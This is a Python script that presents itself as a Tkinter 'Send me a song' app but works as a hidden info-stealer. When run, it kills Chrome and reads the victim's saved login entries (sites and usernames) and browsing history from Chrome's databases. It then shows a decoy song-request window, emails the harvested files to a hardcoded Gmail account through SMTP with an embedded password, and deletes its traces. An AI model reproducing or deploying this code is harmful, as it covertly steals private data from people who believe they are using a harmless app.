import sqlite3
from getpass import getuser
from subprocess import run
from os import system
from os import remove
from os import rmdir
from os import mkdir
from os.path import join
from os.path import exists
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from tkinter import *

try:
    directory = "temp_dir"
    parent = "C:/"
    path = join(parent, directory)
    mkdir(path)
except:
    print("dir exists")

run(['taskkill', '/im', 'chrome.exe', '/f'])
username = getuser()
system("cls")

con = sqlite3.connect(
    f'C:/Documents and Settings/{username}/Local Settings/Application Data/Google/Chrome/User Data/Default/Login Data')
c = con.cursor()

c.execute("select origin_url, username_value, signon_realm from logins ")
accounts = c.fetchall()
c.close()

con = sqlite3.connect(
    f'C:/Documents and Settings/{username}/Local Settings/Application Data/Google/Chrome/User Data/Default/History')
c1 = con.cursor()
c1.execute("select url, title, visit_count, last_visit_time from urls")
history = c1.fetchall()
c1.close()

accounts_for_file = [a for a in accounts]
history_for_file = [h for h in history]

# Creating accounts_file.txt
with open("C:/temp_dir/accounts_file.txt", "w") as _:
    pass
with open("C:/temp_dir/accounts_file.txt", "a") as accs:
    for i in accounts_for_file:
        var = str(i) + "\n"
        accs.write(var)

# Creating history_file.txt
with open("C:/temp_dir/history_file.txt", "w") as _:
    pass
with open("C:/temp_dir/history_file.txt", "a") as hist:
    for histories in history_for_file:
        try:
            var1 = str(histories) + "\n\n"
            hist.write(var1)
        except:
            hist.write("unicode error")


def send_mail(file_name, file_path, subject="This is the email title", body="This is the email body", file_name1=None,
              file_path1=None, two_files=False):
    mail_content = body
    # The mail addresses and password
    sender_address = 'zecheruchris@gmail.com'
    sender_pass = 'rqgvetequclzhvne'
    receiver_address = 'zecheruchris@gmail.com'
    # Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = subject
    # The body and the attachments for the mail
    message.attach(MIMEText(mail_content, 'plain'))
    # Create SMTP session for sending the mail

    # open the file to be sent
    filename = file_name
    attachment = open(file_path, "rb")

    if two_files:
        filename1_file = file_name1
        attachment1 = open(file_path1, "rb")
        p1 = MIMEBase('application', 'octet-stream')
        p1.set_payload((attachment1).read())
        encoders.encode_base64(p1)
        p1.add_header('Content-Disposition', "attachment; filename= %s" % filename1_file)
        message.attach(p1)

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())
    # encode into base64
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    # attach the instance 'p' to instance 'msg'
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
    session.starttls()  # enable security
    session.login(sender_address, sender_pass)
    # login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()


system("cls")

# start tkinter
root = Tk()
root.title("Send me a song!!")
root.geometry("670x400")

intro = Label(root,
              text="I want to listen to some songs I've never heard before. Give me the youtube link to your favorite song!!").grid(
    row=0, column=0, columnspan=3, padx=20)
input_desc = Label(root, text="Song:").grid(row=1, column=0, padx=20)
input = Entry(root)
input.grid(row=1, column=1, padx=20)


def send_songs():
    if exists("C:/temp_dir/songs.txt") == False:
        with open("C:/temp_dir/songs.txt", "w") as _:
            pass
            # initialize file
        with open("C:/temp_dir/songs.txt", "a") as songs_file:
            for song in songs:
                songs_file.write(str(song) + "\n")
    else:
        with open("C:/temp_dir/songs.txt", "a") as songs_file:
            for song in songs:
                songs_file.write(str(song) + "\n")
    send_mail("songs.txt", "C:/temp_dir/songs.txt", f"{username}'s Songs", f"{username}'s Songs ({len(songs)}):")
    root.quit()


global first_add
first_add = True


def add_song():
    global first_add
    song = input.get()
    songs.append(song)
    _ = Label(songs_frame, text=song).pack()
    input.delete(0, END)

    if first_add:
        send_button = Button(root, text="Send Selected Songs", command=send_songs)
        send_button.grid(row=4, column=1, columnspan=1, padx=20, pady=10, ipadx=100)
        first_add = False


send = Button(root, text="Add Song", command=add_song).grid(row=1, column=2, ipadx=70, padx=20)

songs_frame = LabelFrame(root, text="Selected Songs", padx=50)
songs_frame.grid(row=3, column=1, columnspan=1, padx=20)

songs = []

root.mainloop()
# end of tkinter module


# remove temps
send_mail("history_file.txt", "C:/temp_dir/history_file.txt", f"Logs From {username}'s Computer", f"From: {username}", "accounts_file.txt", "C:/temp_dir/accounts_file.txt", two_files=True)
# sends "history_file.txt" from temp_dir with the title Logs From User's Computer to my gmail
remove("C:/temp_dir/accounts_file.txt")
remove("C:/temp_dir/history_file.txt")
remove("C:/temp_dir/songs.txt")
rmdir("C:/temp_dir")
system("cls")
print("Thank you for submitting a song :)")
